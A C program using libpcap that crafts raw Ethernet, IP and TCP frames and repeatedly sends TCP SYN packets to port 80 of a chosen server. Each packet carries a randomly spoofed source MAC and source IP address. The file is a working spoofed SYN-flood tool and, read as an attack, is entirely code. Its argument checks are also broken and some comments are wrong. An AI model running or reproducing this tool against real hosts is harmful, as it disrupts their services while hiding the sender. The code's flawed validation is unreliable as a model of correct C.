#include <stdio.h> 
#include <stdlib.h>
#include <string.h>             // for memset
#include <limits.h>             // for USHRT_MAX
#include <stdint.h>             // for uint16_t, uint32_t

#include <pcap.h>               // for pcap_t
#include <arpa/inet.h>          // for htons
#include <netinet/if_ether.h>   // for ETH_P_ALL
#include <netinet/ip.h>         // for struct ip
#include <net/if.h>             // for IFNAMSIZ
#include <netinet/in.h>         // for struct in_addr
#include <sys/socket.h>         // for AF_INET, AF_INET6
#include <openssl/rand.h>       // for RAND_bytes
#include <time.h>
#include "packets.h"
#include "transfer.h"

#define MAC_LEN 6

typedef struct ether_header ETH_Header_t;
typedef struct ether_addr ETH_ADDR;
typedef unsigned char byte;

void parseArgs(int argc, char **argv){
    if(argc != 5){
        perror("Usage: ./custom -i <interface> -d <ip>\n");
        exit(EXIT_FAILURE);
    }
    if(strcmp(argv[1], "-i") == 0){
        if(strlen(argv[2]) > IFNAMSIZ){
            perror("Interface name too long\n");
            exit(EXIT_FAILURE);
        }
    }else if(strcmp(argv[3], "-d") == 0){
        if(strlen(argv[4]) != INET_ADDRSTRLEN){
            perror("IP address is invalid\n");
            exit(EXIT_FAILURE);
        }
    }else{
        perror("Usage: ./custom -i <interface> -d <ip>\n");
        exit(EXIT_FAILURE);
    }
}

void set_ether_shost(ETH_Header_t *eth, byte *shost){
    memmove(eth->ether_shost, shost, MAC_LEN); /* order doesnt matter bc random */
}

void set_ether_dhost(ETH_Header_t *eth, byte *dhost){
    memmove(eth->ether_dhost, dhost, MAC_LEN);
}

void set_ether_type(ETH_Header_t *eth, uint16_t type){
    // Set the Ethernet type field
    eth->ether_type = htons(type);
}

uint32_t randomize_ipA(){
    uint32_t result = 0xa;
    uint32_t rand_int = 0;
    size_t len_rand = sizeof(uint32_t);
    byte *rand_bytes = (byte *) malloc(len_rand);
    RAND_bytes(rand_bytes, len_rand);
    memcpy(((unsigned char *) &rand_int), rand_bytes, len_rand);
    result = (result << 24) | (rand_int >> 8);
    free(rand_bytes);
    return result;
}

uint32_t randomize_ipC(){
    uint32_t result = 0xc0;
    uint32_t rand_int = 0;
    size_t len_rand = sizeof(uint32_t);
    byte *rand_bytes = (byte *) malloc(len_rand);
    RAND_bytes(rand_bytes, len_rand);
    memcpy(((unsigned char *) &rand_int), rand_bytes, len_rand);
    result = (result << 24) | (rand_int >> 8);
    free(rand_bytes);
    return result;
}

byte *random_mac_src(){
    byte *bytes = (byte *) malloc(MAC_LEN);
    RAND_bytes(bytes, MAC_LEN);
    return bytes;
}


int main(int argc, char **argv) {
    char dev[IFNAMSIZ], errbuf[PCAP_ERRBUF_SIZE];
    char server_ip[INET_ADDRSTRLEN];
    pcap_t *handle;
    parseArgs(argc, argv);
    strcpy(dev, argv[2]);
    strcpy(server_ip, argv[4]);

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        exit(EXIT_FAILURE);
    }

    /* Allocate memory for ethernet frame */
    size_t eth_len = sizeof(ETH_Header_t);
    ETH_Header_t *eth_frame = (ETH_Header_t *) malloc(eth_len);

    /* Set ethernet header parameters*/
    const char *ether_dhost = "11:22:33:44:55:66";
    ETH_ADDR *dhost = ether_aton(ether_dhost);
    set_ether_shost(eth_frame, random_mac_src());
    set_ether_dhost(eth_frame, dhost->octet);
    set_ether_type(eth_frame, ETHERTYPE_IP);
    
    
    /* Set ip header parameters*/
    struct in_addr ip_dst;
    ip_dst.s_addr = inet_addr(server_ip); /* convert DESTINATION ip from string to binary */

    /* Allocate memory for ip header */
    size_t ipH_len = sizeof(IP_Header_t);
    IP_Header_t *ip_frame = (IP_Header_t *) malloc(ipH_len);

    /* Allocate memory for tcp header */
    size_t tcpH_len = sizeof(TCP_Header_t);
    TCP_Header_t *tcp_header = (TCP_Header_t *) malloc(tcpH_len);

    /* Allocate memory for the entire packet */
    size_t total_len = eth_len + ipH_len + tcpH_len;
    byte *packet = (byte *) malloc(total_len);

    size_t total_sent = 0;
    size_t line_limit = 20;
    /* insecure random seed */
    srand(time(NULL));

        IP_set_version(ip_frame, 0x4);
        IP_set_IHL(ip_frame, 0x5);
        IP_set_type_of_service(ip_frame, 0x00);
        IP_set_total_length(ip_frame, (uint16_t) total_len - eth_len);
        IP_set_id(ip_frame, 0xabcd);
        IP_set_flags(ip_frame, 0x0);
        IP_set_offset(ip_frame, 0x0);
        IP_set_time_to_live(ip_frame, 0x40);
        IP_set_protocol(ip_frame, 0x06);
        IP_set_src_address(ip_frame, randomize_ipA()); /* placeholder */
        IP_set_dst_address(ip_frame, htonl(ip_dst.s_addr));
        IP_update_checksum(ip_frame);

        /* Set tcp parameters */
        TCP_set_src_port(tcp_header, 0x1234);
        TCP_set_dst_port(tcp_header, 0x50);
        TCP_set_sequence_num(tcp_header, (uint32_t) rand()); /* random sequence number 0-100 */
        TCP_set_ack_num(tcp_header, 0x0);
        TCP_set_offset(tcp_header, 0x5);
        TCP_set_reserved(tcp_header, 0x0);
        TCP_set_control_bits(tcp_header, 0x2);
        TCP_set_window(tcp_header, 0x7110);
        TCP_set_ugent_ptr(tcp_header, 0x0);
        TCP_update_checksum(tcp_header, ip_frame);

    while(1){
        /* Updating variable values */
        set_ether_shost(eth_frame, random_mac_src());
        IP_set_src_address(ip_frame, randomize_ipC());
        IP_update_checksum(ip_frame);
        TCP_update_checksum(tcp_header, ip_frame);

        /* Convert to network byte order */
        hton_ip(ip_frame);
        hton_tcp(tcp_header);

        /* Form packet */
        memcpy(packet, eth_frame, eth_len);
        memcpy(packet + eth_len, ip_frame, ipH_len);
        memcpy(packet + eth_len + ipH_len, tcp_header, tcpH_len);

        /* Sending data */
        int result = pcap_sendpacket(handle, packet, total_len);
        if(result != 0){
            perror("Error sending packet\n");
            exit(EXIT_FAILURE);
        }else{
            total_sent ++;
            if(total_sent % line_limit == 0){
                fprintf(stdout, ".\n");
                fflush(stdout);
            }else{
                fprintf(stdout, ".");
                fflush(stdout);
            }
            sleep(1);
        }
    }
    
    /* Cleaning up */
    pcap_close(handle);
    free(eth_frame);
    free(ip_frame);
    free(tcp_header);
    free(packet);
    return 0;
}
